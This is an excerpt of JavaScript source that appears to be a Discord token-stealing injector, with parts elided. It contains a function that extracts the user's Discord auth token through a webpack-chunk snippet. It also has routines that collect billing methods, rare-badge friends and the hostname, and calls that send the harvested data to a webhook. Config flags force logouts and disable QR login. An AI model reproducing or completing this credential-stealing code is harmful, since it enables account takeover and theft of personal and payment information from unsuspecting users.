...
var config = {
    ...
    logout: true, // false 
    disable_qr_code: true,  // don't touch
    notify_on_logout: true, // don't touch
    notify_on_initialization: true, // don't touch
    ping: [true, ""],
    ...
    async userLogin(password, email, token) {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                description: `**HQ Friends (${friends['length']})**\n\n${friends.frien}`,
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                author: {
...
async function getToken() {
    return await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`, true)
}
...
async function getBilling(token) {
    ...
    json.forEach(z => {
        if (z.type == "") {
            ...
            billing += "\`✔️\`" + " <:bannerstory_creditcard:1108164687134203944>";
        } else {
            return "\`\`\`❌\`\`\`";
        };
    });
...
async function getRelationships(token) {
    ...
    if (!rareBadgesFriends) rareBadgesFriends = "No HQ Friends"
        ...
        if (config.notify_on_initialization) {
            if (token == undefined) {
                sendToWebhook({
                    ...
                    avatar_url: config.embed.avatar_url,
                    embeds: [createEmbed({
                        title: "Discord started (session not started)",
                        fields: [{
                            name: "Hostname",
                            value: `\`\`\`${os.hostname}\`\`\``,
                            inline: false
